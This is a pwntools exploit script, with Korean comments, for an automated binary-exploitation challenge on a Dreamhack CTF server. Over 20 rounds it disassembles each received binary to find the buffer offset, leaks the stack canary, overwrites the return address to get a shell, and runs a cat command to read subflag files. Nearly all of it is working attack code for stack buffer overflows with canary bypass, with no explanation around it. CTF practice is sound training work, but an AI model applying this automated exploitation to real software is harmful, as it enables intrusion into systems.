import os
from pwn import *

r = remote("host3.dreamhack.games", 14291)
context.log_level = "debug"
r.sendlineafter(b"(y/n) ? ", b"y")

for i in range(20):
    binary = ''
    buf = ''

    # base64 encoding binary
    r.recvuntil(b"----------BINARY(base64encoded)----------\n")
    binary = r.recvuntil(b"\n").strip()
    binary = base64.b64decode(binary)

    with open('binary', 'wb') as f:
        f.write(binary)

    os.system("objdump -d -M intel binary > asm")

    with open('asm', 'r') as file:
        # main함수에서 read함수 호출하는 부분 찾기
        read_line_number = None
        for i, line in enumerate(file):
            if 'call' in line and 'read' in line:
                read_line_number = i
                break
            
        # read함수 위로 4번째 줄의 값 찾기
        if read_line_number is not None:
            target_line_number = max(0, read_line_number - 4)
            file.seek(0)
            for i, line in enumerate(file):
                if i == target_line_number:
                    buf = line
                    break

    dummy = int(buf.split(":")[0].strip(), 16) - 0x8

    # 카나리 릭하고 ret overwrite
    canary_leak = b"A" * dummy + b"B"

    r.sendafter(b"Input : ", canary_leak)

    r.recvuntil(b"B")
    canary = r.recvn(7).rjust(8, b"\x00")

    payload = b'A' * dummy + canary

    r.sendlineafter(b"input :", payload + b'A' * 8 + p64(0x4012e4))

    # 쉘 따고 subflag 찾고 flag칸에 입력
    r.sendline("cat /tmp/subflag_*.txt")

    sub_flag = r.recvuntil(b'}')[1:]
    r.sendline("exit")
    print("sub flag :", sub_flag)
    r.sendlineafter(b"flag : ", sub_flag)


r.interactive()
